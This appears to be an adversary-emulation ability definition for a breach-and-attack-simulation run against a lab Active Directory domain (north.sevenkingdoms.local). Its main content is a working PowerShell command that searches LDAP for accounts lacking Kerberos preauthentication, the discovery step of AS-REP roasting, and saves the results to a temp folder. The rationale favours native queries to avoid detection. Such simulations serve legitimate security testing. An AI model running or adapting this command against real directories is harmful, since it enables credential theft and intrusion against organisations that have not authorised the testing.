ability.name: Native AS-REP Roast Discovery
ability.description: Queries north.sevenkingdoms.local via ADSI to find accounts that do not require Kerberos preauthentication to facilitate targeted AS-REP roasting.

stages.command_template: $d='C:\Windows\Temp\bas'; if(!(Test-Path "$d\cred_access")){ni -ItemType Directory -Force "$d\cred_access"|out-null}; $(try { $roastable = @(); try { $searcher = [ADSISearcher]"(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))"; $searcher.SearchRoot = [ADSI]"LDAP://192.168.127.11/DC=north,DC=sevenkingdoms,DC=local"; foreach($res in $searcher.FindAll()) { $roastable += $res.Properties.samaccountname }; if ($roastable.Count -gt 0) { Write-Output "Found roastable accounts: $($roastable -join ', ')" } else { Write-Output "No accounts found with DONT_REQ_PREAUTH" } } catch { Write-Output "AS-REP LDAP search failed: $_" } } catch { "ERROR: $_" }) | Tee-Object -FilePath "$d\cred_access\asrep_out.txt"

rationale: Finds vulnerable accounts that do not enforce pre-authentication natively over ADSI to avoid noisy or unauthorized external tooling.
